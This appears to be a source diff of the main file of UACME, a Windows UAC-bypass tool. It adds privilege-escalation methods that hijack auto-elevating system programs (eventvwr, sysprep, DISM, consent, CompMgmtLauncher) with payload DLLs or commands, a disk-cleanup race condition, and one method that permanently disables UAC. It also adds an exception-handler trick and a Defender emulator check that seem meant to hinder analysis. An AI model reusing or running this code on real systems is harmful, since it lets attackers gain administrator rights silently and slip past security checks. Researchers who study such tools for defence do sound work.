@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2016
+*  (C) COPYRIGHT AUTHORS, 2014 - 2017
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     2.20
+*  VERSION:     2.56
 *
-*  DATE:        25 May 2016
+*  DATE:        13 Feb 2017
 *
 *  Program entry point.
 *
@@ -20,8 +20,10 @@
 #include "global.h"
 #include <gl\GL.h>
 #pragma comment(lib, "opengl32.lib")
+#pragma comment(lib, "comctl32.lib")
 
 UACMECONTEXT g_ctx;
+TEB_ACTIVE_FRAME_CONTEXT g_fctx = { 0, "=^_^=" };
 
 static pfnDecompressPayload pDecryptPayload = NULL;
 
@@ -60,8 +62,8 @@ UINT ucmInit(
     VOID
     )
 {
-    BOOL cond = FALSE;
-    DWORD Result = ERROR_SUCCESS;
+    BOOL        cond = FALSE;
+    DWORD       Result = ERROR_SUCCESS;
     PVOID       Ptr;
     MSG         msg1;
     WNDCLASSEX  wincls;
@@ -91,13 +93,25 @@ UINT ucmInit(
     };
 
     do {
-
-        if (FAILED(CoInitialize(NULL)))
+        //we could read this from usershareddata but why not use it
+        bytesIO = 0;
+        RtlQueryElevationFlags(&bytesIO);
+        if ((bytesIO & DBG_FLAG_ELEVATION_ENABLED) == 0) {
+            Result = ERROR_ELEVATION_REQUIRED;
             break;
+        }
+
+        if (FAILED(CoInitialize(NULL))) {
+            Result = ERROR_INTERNAL_ERROR;
+            break;
+        }
+
+        InitCommonControls();
 
         //fill common data block
         RtlSecureZeroMemory(&g_ctx, sizeof(g_ctx));
 
+        g_ctx.Flag = AKAGI_FLAG_KILO;
         g_ctx.Peb = NtCurrentPeb();
         inst = g_ctx.Peb->ImageBaseAddress;
 
@@ -112,6 +126,9 @@ UINT ucmInit(
         if (g_ctx.Method == 0 || g_ctx.Method >= UacMethodMax) {
             return ERROR_BAD_ARGUMENTS;
         }
+
+        if (g_ctx.Method == UacMethodSXS)
+            g_ctx.Flag = AKAGI_FLAG_TANGO;
 
 #ifndef _DEBUG
         ElevType = TokenElevationTypeDefault;
@@ -138,7 +155,6 @@ UINT ucmInit(
 
         TempWindow = CreateWindowEx(WS_EX_TOPMOST, WndClassName, WndTitleName,
             WS_VISIBLE | WS_POPUP | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, 0, 0, 30, 30, NULL, NULL, inst, NULL);
-
 
         //remember dll handles
         g_ctx.hKernel32 = GetModuleHandleW(KERNEL32_DLL);
@@ -178,6 +194,13 @@ UINT ucmInit(
         }
 
         g_ctx.IsWow64 = supIsProcess32bit(GetCurrentProcess());
+
+        if (g_ctx.dwBuildNumber > 14997) {
+            g_ctx.IFileOperationFlags = FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION;
+        }
+        else {
+            g_ctx.IFileOperationFlags = FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION;
+        }
 
         //flashes and sparks
         dc1 = GetDC(TempWindow);
@@ -227,6 +250,9 @@ UINT ucmInit(
         case UacMethodAVrf:
             dwType = HIBIKI_ID;
             break;
+        case UacMethodSXSConsent:
+            dwType = IKAZUCHI_ID;
+            break;
         default:
             dwType = FUBUKI_ID;
             break;
@@ -258,16 +284,18 @@ UINT ucmInit(
 UINT ucmMain()
 {
     DWORD   paramLen;
-    WCHAR  *pDllName;
+    WCHAR  *pFileName;
     WCHAR   szBuffer[MAX_PATH * 2];
     UINT    uResult;
 
-#ifdef GENERATE_COMPRESSED_PAYLOAD
-    CompressPayload();
-#endif
+    supCheckMSEngineVFS();
 
     uResult = ucmInit();
     switch (uResult) {
+
+    case ERROR_ELEVATION_REQUIRED:
+        ucmShowMessage(TEXT("Please enable UAC for this account."));
+        break;
 
     case ERROR_UNSUPPORTED_TYPE:
         ucmShowMessage(TEXT("Admin account with limited token required."));
@@ -315,6 +343,7 @@ UINT ucmMain()
         break;
 
     case UacMethodOobe://oobe service
+        //fixed in 10548
         if (g_ctx.dwBuildNumber >= 10548) {
             if (ucmShowQuestion(UACFIX) == IDNO)
                 return ERROR_UNSUPPORTED_TYPE;
@@ -334,6 +363,7 @@ UINT ucmMain()
         break;
 
     case UacMethodSimda:
+        //fixed in 10136
         if (g_ctx.dwBuildNumber >= 10136) {
             if (ucmShowQuestion(UACFIX) == IDNO)
                 return ERROR_UNSUPPORTED_TYPE;
@@ -341,6 +371,7 @@ UINT ucmMain()
         break;
 
     case UacMethodCarberp1:
+        //fixed in 10147
         if (g_ctx.dwBuildNumber >= 10147) {
             if (ucmShowQuestion(UACFIX) == IDNO)
                 return ERROR_UNSUPPORTED_TYPE;
@@ -348,6 +379,7 @@ UINT ucmMain()
         break;
 
     case UacMethodCarberp2:
+        //fixed in 10147
         if (g_ctx.dwBuildNumber >= 10147) {
             if (ucmShowQuestion(UACFIX) == IDNO)
                 return ERROR_UNSUPPORTED_TYPE;
@@ -362,6 +394,7 @@ UINT ucmMain()
         break;
 
     case UacMethodAVrf:
+        //fixed in 10136
         if (g_ctx.dwBuildNumber >= 10136) {
             if (ucmShowQuestion(UACFIX) == IDNO)
                 return ERROR_UNSUPPORTED_TYPE;
@@ -369,6 +402,7 @@ UINT ucmMain()
         break;
 
     case UacMethodWinsat:
+        //fixed in 10548
         if (g_ctx.dwBuildNumber >= 10548) {
             if (ucmShowQuestion(UACFIX) == IDNO)
                 return ERROR_UNSUPPORTED_TYPE;
@@ -387,11 +421,12 @@ UINT ucmMain()
 #endif
         break;
 
-    case UacMethodMMC:
+    case UacMethodMMC1:
 #ifndef _WIN64
         ucmShowMessage(WIN64ONLY);
         return ERROR_UNSUPPORTED_TYPE;
 #else
+        //fixed in 14316
         if (g_ctx.dwBuildNumber >= 14316) {
             if (ucmShowQuestion(UACFIX) == IDNO)
                 return ERROR_UNSUPPORTED_TYPE;
@@ -400,6 +435,8 @@ UINT ucmMain()
         break;
 
     case UacMethodSirefef:
+
+        //fixed in 10548
         if (g_ctx.dwBuildNumber >= 10548) {
             if (ucmShowQuestion(UACFIX) == IDNO)
                 return ERROR_UNSUPPORTED_TYPE;
@@ -407,6 +444,8 @@ UINT ucmMain()
         break;
 
     case UacMethodGeneric:
+
+        //fixed in 14316
         if (g_ctx.dwBuildNumber >= 14316) {
             if (ucmShowQuestion(UACFIX) == IDNO)
                 return ERROR_UNSUPPORTED_TYPE;
@@ -418,6 +457,8 @@ UINT ucmMain()
             ucmShowMessage(OSTOOOLD);
             return ERROR_UNSUPPORTED_TYPE;
         }
+
+        //fixed in 14316
         if (g_ctx.dwBuildNumber >= 14316) {
             if (ucmShowQuestion(UACFIX) == IDNO)
                 return ERROR_UNSUPPORTED_TYPE;
@@ -429,7 +470,107 @@ UINT ucmMain()
             ucmShowMessage(WINBLUEWANTED);
             return ERROR_UNSUPPORTED_TYPE;
         }
+
+        //fixed in 14371
+        if (g_ctx.dwBuildNumber > 14367) {
+            if (ucmShowQuestion(UACFIX) == IDNO)
+                return ERROR_UNSUPPORTED_TYPE;
+        }
         break;
+
+    case UacMethodManifest:
+
+        //fixed in 14371
+        if (g_ctx.dwBuildNumber > 14367) {
+            if (ucmShowQuestion(UACFIX) == IDNO)
+                return ERROR_UNSUPPORTED_TYPE;
+        }
+        break;
+
+    case UacMethodInetMgr:
+#ifndef _WIN64
+        ucmShowMessage(WIN64ONLY);
+        return ERROR_UNSUPPORTED_TYPE;
+#else 
+        //fixed in 14376
+        if (g_ctx.dwBuildNumber > 14372) {
+            if (ucmShowQuestion(UACFIX) == IDNO)
+                return ERROR_UNSUPPORTED_TYPE;
+        }
+#endif
+        break;
+
+    case UacMethodMMC2:
+#ifndef _WIN64
+        ucmShowMessage(WIN64ONLY);
+        return ERROR_UNSUPPORTED_TYPE;
+#else
+#endif
+        break;
+
+    case UacMethodSXS:
+#ifndef _WIN64
+        ucmShowMessage(WIN64ONLY);
+        return ERROR_UNSUPPORTED_TYPE;
+#else
+#endif
+        break;
+
+    case UacMethodSXSConsent: //for smehuechki
+#ifndef _WIN64
+        ucmShowMessage(WIN64ONLY);
+        return ERROR_UNSUPPORTED_TYPE;
+#else
+#endif
+        break;
+
+    case UacMethodDISM:
+#ifndef _WIN64
+        ucmShowMessage(WIN64ONLY);
+        return ERROR_UNSUPPORTED_TYPE;
+#else
+#endif
+        break;
+
+    case UacMethodComet:
+        //fixed in 15031
+        if (g_ctx.dwBuildNumber >= 15031) {
+            if (ucmShowQuestion(UACFIX) == IDNO)
+                return ERROR_UNSUPPORTED_TYPE;
+        }
+        break;
+
+    case UacMethodEnigma0x3:
+        //fixed in 15031
+        if (g_ctx.dwBuildNumber >= 15031) {
+            if (ucmShowQuestion(UACFIX) == IDNO)
+                return ERROR_UNSUPPORTED_TYPE;
+        }
+        break;
+
+    case UacMethodEnigma0x3_2:
+        //partially fixed in 15031, main advantage of this method is lost
+        if (g_ctx.dwBuildNumber >= 15031) {
+            if (ucmShowQuestion(UACFIX) == IDNO)
+                return ERROR_UNSUPPORTED_TYPE;
+        }
+
+#ifndef _DEBUG
+        if (g_ctx.dwBuildNumber < 10240) {
+            ucmShowMessage(WIN10ONLY);
+            return ERROR_UNSUPPORTED_TYPE;
+        }
+#endif
+        //ban usage under wow64 (dismhost is x64 and x64 dlls are not present in 32bit version of this tool).
+        if (g_ctx.IsWow64) {
+            ucmShowMessage(WOW64STRING);
+            return ERROR_UNSUPPORTED_TYPE;
+        }
+        break;
+
+    case UacMethodExpLife:
+        break;
+
     }
 
     //prepare command for payload
@@ -437,11 +578,13 @@ UINT ucmMain()
     RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
     GetCommandLineParam(GetCommandLine(), 2, szBuffer, MAX_PATH, &paramLen);
     if (paramLen > 0) {
-        if (g_ctx.Method != UacMethodRedirectExe) {
+        if ((g_ctx.Method != UacMethodRedirectExe) && 
+            (g_ctx.Method != UacMethodComet) && 
+            (g_ctx.Method != UacMethodEnigma0x3)) 
+        {
             supSetParameter((LPWSTR)&szBuffer, paramLen * sizeof(WCHAR));
         }
-    }
-
+    }    
 
     //check environment and execute method if it met requirements
     switch (g_ctx.Method) {
@@ -485,7 +628,7 @@ UINT ucmMain()
         }
 #endif
         if (MessageBox(GetDesktopWindow(),
-            TEXT("This method will TURN UAC OFF, are you sure? You will need to reenable it after manually."),
+            TEXT("This method will permanently TURN UAC OFF, are you sure?"),
             PROGRAMTITLE, MB_ICONQUESTION | MB_YESNO) == IDYES)
         {
             if (ucmSimdaTurnOffUac()) {
@@ -531,7 +674,7 @@ UINT ucmMain()
             return ERROR_SUCCESS;
         }
         break;
-
+        
     case UacMethodWinsat:
 #ifndef _DEBUG
         if (g_ctx.IsWow64) {
@@ -540,29 +683,29 @@ UINT ucmMain()
         }
 #endif
         if (g_ctx.dwBuildNumber < 9200) {
-            pDllName = POWRPROF_DLL;
+            pFileName = POWRPROF_DLL;
         }
         else {
-            pDllName = DEVOBJ_DLL;
+            pFileName = DEVOBJ_DLL;
         }
 
-        if (ucmWinSATMethod(pDllName, g_ctx.PayloadDll, g_ctx.PayloadDllSize, (g_ctx.dwBuildNumber <= 10136))) {
+        if (ucmWinSATMethod(pFileName, g_ctx.PayloadDll, g_ctx.PayloadDllSize, (g_ctx.dwBuildNumber <= 10136))) {
             return ERROR_SUCCESS;
         }
         break;
 
-    case UacMethodMMC:
+    case UacMethodMMC1:
 #ifndef _DEBUG
         if (g_ctx.IsWow64) {
             ucmShowMessage(WOW64STRING);
             return ERROR_UNSUPPORTED_TYPE;
         }
 #endif
-        if (ucmMMCMethod(ELSEXT_DLL, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
+        if (ucmMMCMethod(UacMethodMMC1, ELSEXT_DLL, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
             return ERROR_SUCCESS;
         }
         break;
-
+        
     case UacMethodSirefef:
 #ifndef _DEBUG
         if (g_ctx.IsWow64) {
@@ -626,12 +769,149 @@ UINT ucmMain()
         }
         break;
 
+//allow only in win64 version because of laziness
+#ifdef _WIN64
+    case UacMethodInetMgr:
+        if (ucmInetMgrMethod()) {
+            return ERROR_SUCCESS;
+        }
+        break;
+
+    case UacMethodMMC2:
+        if (ucmMMCMethod(UacMethodMMC2, WBEMCOMN_DLL, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
+            return ERROR_SUCCESS;
+        }
+        break;
+
+    case UacMethodSXS:
+        if (ucmSXSMethod(g_ctx.PayloadDll, g_ctx.PayloadDllSize, SYSPREP_DIR, SYSPREP_EXE, NULL, FALSE)) {
+            return ERROR_SUCCESS;
+        }
+        break;
+
+    case UacMethodSXSConsent:
+        if (MessageBox(GetDesktopWindow(), TEXT("WARNING: This method will affect UAC interface, are you sure?"), PROGRAMTITLE, MB_YESNO) == IDYES) {
+            if (ucmSXSMethod(g_ctx.PayloadDll, g_ctx.PayloadDllSize, NULL, CONSENT_EXE, EVENTVWR_EXE, TRUE)) {
+                return ERROR_SUCCESS;
+            }
+        }
+        break;
+
+    case UacMethodDISM:
+        if (ucmDismMethod(g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
+            return ERROR_SUCCESS;
+        }
+        break;
+        
+#endif
+    case UacMethodComet:
+        if (ucmCometMethod((paramLen != 0) ? szBuffer : T_DEFAULT_CMD)) {
+            return ERROR_SUCCESS;
+        }
+        break;
+
+    case UacMethodEnigma0x3:
+#ifndef _DEBUG
+        if (g_ctx.IsWow64) { //target application isn't always available under wow64
+            ucmShowMessage(WOW64STRING);
+            return ERROR_UNSUPPORTED_TYPE;
+        }
+#endif
+
+        if (g_ctx.dwBuildNumber >= 15007)
+            pFileName = COMPMGMTLAUNCHER_EXE;
+        else
+            pFileName = EVENTVWR_EXE;
+        
+        if (ucmHijackShellCommandMethod((paramLen != 0) ? szBuffer : NULL, pFileName)) {
+            return ERROR_SUCCESS;
+        }
+        break;
+
+    case UacMethodEnigma0x3_2:
+        if (ucmDiskCleanupRaceCondition()) {
+            return ERROR_SUCCESS;
+        }
+        break;
+
+    case UacMethodExpLife:
+#ifndef _WIN64 //lazy
+        if (g_ctx.IsWow64) { 
+            ucmShowMessage(LAZYWOW64UNSUPPORTED);
+            return ERROR_UNSUPPORTED_TYPE;
+        }
+#endif
+        if (paramLen == 0) {
+            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
+        }
+
+        if (ucmUninstallLauncherMethod(szBuffer)) {
+            return ERROR_SUCCESS;
+        }
+        break;      
     }
 
     return ERROR_ACCESS_DENIED;
 }
 
+DWORD g_ExCookie = 0;
+
+LONG NTAPI ucmVehHandler(
+    EXCEPTION_POINTERS *ExceptionInfo
+)
+{
+    UACME_THREAD_CONTEXT *uctx;
+
+    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
+        if (ExceptionInfo->ExceptionRecord->ExceptionFlags == g_ExCookie) {
+            uctx = (UACME_THREAD_CONTEXT*)RtlGetFrame();
+            while ((uctx != NULL) && (uctx->Frame.Context != &g_fctx)) {
+                uctx = (UACME_THREAD_CONTEXT *)uctx->Frame.Previous;
+            }
+            if (uctx) {
+                if (uctx->ucmMain)
+                    uctx->ucmMain();
+            }
+            ExceptionInfo->ContextRecord->EFlags |= 0x10000;
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+/*
+* main
+*
+* Purpose:
+*
+* Program entry point.
+*
+*/
 VOID main()
 {
-    ExitProcess(ucmMain());
+    PVOID ExceptionHandler;
+    DWORD k;
+    EXCEPTION_RECORD ex;
+    UACME_THREAD_CONTEXT uctx;
+
+    RtlSecureZeroMemory(&uctx, sizeof(uctx)); 
+
+    ExceptionHandler = RtlAddVectoredExceptionHandler(1, &ucmVehHandler);
+    if (ExceptionHandler) {
+        uctx.Frame.Context = &g_fctx;
+        uctx.ucmMain = (pfnEntryPoint)ucmMain;
+        RtlPushFrame((PTEB_ACTIVE_FRAME)&uctx);
+
+        k = ~GetTickCount();
+        g_ExCookie = RtlRandomEx(&k);
+
+        RtlSecureZeroMemory(&ex, sizeof(ex));
+        ex.ExceptionFlags = g_ExCookie;
+        ex.ExceptionCode = (DWORD)STATUS_SINGLE_STEP;
+        RtlRaiseException(&ex);
+
+        RtlRemoveVectoredExceptionHandler(ExceptionHandler);
+        RtlPopFrame((PTEB_ACTIVE_FRAME)&uctx);
+    }
+    ExitProcess(0);
 }
